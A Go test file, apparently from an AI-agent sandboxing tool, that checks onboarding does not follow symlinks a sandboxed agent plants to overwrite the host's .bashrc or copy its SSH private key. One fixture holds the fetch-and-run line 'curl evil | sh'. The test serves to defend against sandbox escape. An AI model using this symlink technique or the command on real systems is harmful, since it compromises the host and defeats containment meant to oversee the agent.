package onboard

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/samaritanark/agent-sandboxes/go/internal/deviation"
)

// plant builds a home with a .bashrc, an SSH key, host Codex and Grok state, and what a sandboxed
// agent can leave in its agent home.
func plant(t *testing.T, agent string, links map[string]string, files map[string]string) (Ctx, string) {
	t.Helper()
	home := t.TempDir()
	w := func(p, s string) {
		os.MkdirAll(filepath.Dir(filepath.Join(home, p)), 0o755)
		os.WriteFile(filepath.Join(home, p), []byte(s), 0o644)
	}
	w(".bashrc", "echo original\n")
	w(".ssh/id_ed25519", "PRIVATE-KEY\n")
	w(".codex/auth.json", "{}")
	w(".grok/auth.json", "{}")
	w(".claude/.credentials.json", "{}")
	ah := filepath.Join(home, ".sandbox/agent-home", agent)
	os.MkdirAll(ah, 0o755)
	for p, s := range files {
		os.WriteFile(filepath.Join(ah, p), []byte(s), 0o644)
	}
	for p, to := range links {
		os.Symlink(to, filepath.Join(ah, p))
	}
	return Ctx{Home: home, AgentHomeBase: filepath.Join(home, ".sandbox/agent-home"), Force: true}, home
}

func intact(t *testing.T, home string, mode string) {
	t.Helper()
	if b, _ := os.ReadFile(filepath.Join(home, ".bashrc")); string(b) != "echo original\n" {
		t.Errorf("%s: ~/.bashrc was written: %q", mode, b)
	}
	filepath.Walk(filepath.Join(home, ".sandbox"), func(p string, fi os.FileInfo, err error) error {
		if err == nil && fi.Mode().IsRegular() {
			if b, _ := os.ReadFile(p); strings.Contains(string(b), "PRIVATE-KEY") {
				t.Errorf("%s: the host key was copied into %s", mode, p)
			}
		}
		return nil
	})
}

func TestFixAgentHomeNoFollow(t *testing.T) {
	scenarios := []struct {
		agent        string
		links, files map[string]string
	}{
		{"codex", map[string]string{"config.toml.tmp": "../../../.bashrc"}, map[string]string{"config.toml": "curl evil | sh\n"}},
		{"grok", map[string]string{"config.toml.tmp": "../../../.bashrc"}, map[string]string{"config.toml": "x = 1\n"}},
		{"codex", map[string]string{"config.toml": "../../../.ssh/id_ed25519"}, nil},
		{"grok", map[string]string{"config.toml": "../../../.ssh/id_ed25519"}, nil},
		{"codex", map[string]string{"auth.json": "../../../.bashrc"}, nil},
		{"claude", map[string]string{".credentials.json": "../../../.bashrc"}, nil},
	}
	// legacy: each scenario reaches outside the agent home
	escaped := 0
	for _, s := range scenarios {
		x, home := plant(t, s.agent, s.links, s.files)
		x.Agent(s.agent)
		b, _ := os.ReadFile(filepath.Join(home, ".bashrc"))
		cfg, _ := os.ReadFile(filepath.Join(home, ".sandbox/agent-home", s.agent, "config.toml"))
		if string(b) != "echo original\n" || strings.Contains(string(cfg), "PRIVATE-KEY") {
			escaped++
		}
	}
	if escaped != len(scenarios) {
		t.Fatalf("legacy: %d of %d scenarios escaped; the bash escapes in all", escaped, len(scenarios))
	}
	defer deviation.Force(deviation.AgentHomeNoFollow)()
	for _, s := range scenarios {
		x, home := plant(t, s.agent, s.links, s.files)
		o, _ := x.Agent(s.agent)
		intact(t, home, s.agent)
		if !strings.Contains(strings.Join(o.Stdout, "\n"), "not a regular file") {
			t.Errorf("fixed %s %v: no refusal reported: %q", s.agent, s.links, o.Stdout)
		}
	}
	// the agent-home directory itself as a link
	x, home := plant(t, "elsewhere", nil, nil)
	os.Symlink("../../.ssh", filepath.Join(home, ".sandbox/agent-home/codex"))
	x.Agent("codex")
	if _, err := os.Stat(filepath.Join(home, ".ssh/auth.json")); err == nil {
		t.Error("fixed: wrote through a linked agent-home directory")
	}
	// ordinary onboarding still works, and leaves regular 0600 files
	x, home = plant(t, "codex", nil, nil)
	x.Agent("codex")
	for _, f := range []string{"auth.json", "config.toml"} {
		st, err := os.Lstat(filepath.Join(home, ".sandbox/agent-home/codex", f))
		if err != nil || !st.Mode().IsRegular() || st.Mode().Perm() != 0o600 {
			t.Errorf("fixed: %s: %v %v", f, st.Mode(), err)
		}
	}
}
